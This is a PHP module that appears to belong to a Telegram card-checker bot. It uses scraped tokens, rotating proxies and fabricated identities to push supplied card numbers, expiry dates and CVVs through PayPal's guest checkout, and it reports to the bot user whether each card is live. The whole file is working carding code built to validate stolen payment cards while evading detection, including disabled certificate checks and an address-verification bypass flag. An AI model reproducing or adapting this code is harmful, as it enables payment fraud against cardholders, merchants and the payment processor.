<?php

use App\Models\Bot;
use App\Gate\{CurlX, Make, Responses as Res};
use App\Faker\{Name, Address, PhoneNumber, Internet};

$ccs = $ccs[0];
$cc  = $ccs['cc'];
$cece = implode('|', $cc);
$user['ida'] = Bot::SendMsg($user['chat_id'], "<b>Gate <u>".$gate['name']."</u> <i>started</i>♻️\nCard: <code>".implode('|', $cc)."</code>\nTime:</b> <i>".Make::Took()."'s</i>", $user['msg_id'])['result']['message_id'];
# -- REQ 1 -- #
$ch = curl_init('https://www.paypal.com/cgi-bin/webscr');
curl_setopt_array($ch, [CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_PROXY => 'p.webshare.io:80', CURLOPT_PROXYUSERPWD => CurlX::GetRandVal(APP_PATH . '/public/files/proxy/webshare.txt')]);
curl_setopt_array($ch, [
    CURLOPT_HTTPHEADER => ['Host: www.paypal.com','Content-Type: application/x-www-form-urlencoded','accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','origin: https://connectbiz.com','referer: https://connectbiz.com/','user-agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36'],
    CURLOPT_POST => 1,
    CURLOPT_POSTFIELDS => 'cmd=_s-xclick&hosted_button_id=36507&on0=Term&os0=1+Year+%286+issues%29&currency_code=USD&submit.x=91&submit.y=7',
]);
$r1 = curl_exec($ch);

$token = CurlX::ParseString($r1, '&amp;token=', '&');
$mfid = CurlX::ParseString($r1, 'mfid=', '&');
$j = CurlX::ParseString($r1, '&calc=', '=');
$calc = str_replace('&nsid', '', $j);
$csi = CurlX::ParseString($r1, '&csci=', '&');

if(empty($token)){
    Res::SetParams("Empty Req 1 Token");
    $res = Res::paypal();
    Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Parse($lang['final'], $user, $cece, $res, $ccs['bin'], $gate['name']));
    exit();
}
Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Wait(1, $cece, $gate['name'], $lang['wait']));

# ~ REQ 2 ~ #
$headers2 = ['accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','host: www.paypal.com','user-agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36'];
$site2 = ['url' => 'https://www.paypal.com/webapps/xoonboarding?token='.$token.'&useraction=commit&mfid='.$mfid.'&rcache=2&cookieBannerVariant=hidden&country.x=US&locale.x=en_US&locale.x=en_US&country.x=US','method' => 'GET', 'post' => null, 'headers' => $headers2, 'cookie' => null, 'proxy' => $proxy2];
$req2 = Make::Create(2, $site2, $gate, $user);
IsUnspam($req2, $user);
$csrf = CurlX::ParseString($req2->body, '"x-csrf-jwt": "', '"');
if(empty($csrf)){
    Res::SetParams("Empty Req 2 Token");
    $res = Res::paypal();
    Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Parse($lang['final'], $user, $cece, $res, $ccs['bin'], $gate['name']));
    exit();
}
Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Wait(2, $cece, $gate['name'], $lang['wait']));

# ~ REQ 3 ~ #
$headers3 = ['Host: www.paypal.com','accept: */*','content-type: application/json;charset=UTF-8','origin: https://www.paypal.com','referer: https://www.paypal.com/webapps/xoonboarding?token='.$token.'&useraction=commit&mfid='.$mfid.'&rcache=2&cookieBannerVariant=hidden&country.x=US&locale.x=en_US&locale.x=en_US&country.x=US','user-agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36',"x-csrf-jwt: $csrf",'x-requested-with: XMLHttpRequest'];
$post3 = '{"data":{"user":{"first_name":"'.Name::firstName().'","last_name":"'.Name::lastName().'","email":"'.Internet::freeEmail().'","countryOfResidence":"US","country":"US","nationality":"US"},"billing_address":{"line1":"street 44","city":"new york","state":"NY","postal_code":"10001","country":"US"},"shipping_address":{"first_name":"'.Name::firstName().'","last_name":"'.Name::lastName().'","line1":"street 44","city":"new york","state":"NY","postal_code":"10001","country":"US"},"phone":{"type":"Mobile","number":"673309'.rand(1111,9999).'","countryCode":"1"},"shipping_address_validation":false,"billing_address_present":true,"prox_flow":false,"testParams":{},"content_identifier":"US:en:3.0.292:undefined","frs_optin_flow_applicable":true,"frs_optin_active_flow":false,"flow_eligibility_data":{"is_unbranded":false,"merchant_preferences":{"id":"3GHG76DBBXQ2J","meta":{"populated":true},"auto_return":{"enabled":false},"pdt":{"enabled":false},"account_optional":{"enabled":true},"merchant_blacklist":{"enabled":false},"merchant_vertical_high_risk":{"enabled":false},"charset":"windows-1252"},"merchant_country":"US"},"bypass_address_verification":true,"bypass_authorization":false,"card":{"type":"MASTERCARD","number":"'.$cc[0].'","security_code":"'.$cc[3].'","expiry_month":"'.$cc[1].'","expiry_year":"'.$cc[2].'"},"skipInitiateAuth":true},"meta":{"token":"'.$token.'","calc":"'.$calc.'","csci":"'.$csi.'","locale":{"country":"US","language":"en"},"state":"ui_checkout_guest","app_name":"xoonboardingnodeweb"}}';
$site3 = ['url' => 'https://www.paypal.com/webapps/xoonboarding/api/onboard/guest','method' => 'POST', 'post' => $post3, 'headers' => $headers3, 'cookie' => null, 'proxy' => $proxy2];
$req3 = Make::Create(3, $site3, $gate, $user);
IsUnspam($req3, $user);
if(empty($req3->body)){
    Res::SetParams("Req 3 Error");
    $res = Res::paypal();
    Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Parse($lang['final'], $user, $cece, $res, $ccs['bin'], $gate['name']));
    exit();
}
Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Wait(3, $cece, $gate['name'], $lang['wait']));

Res::SetParams($req3->body);
$res = Res::paypal();
Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Parse($lang['final'], $user, $cece, $res, $ccs['bin'], $gate['name']));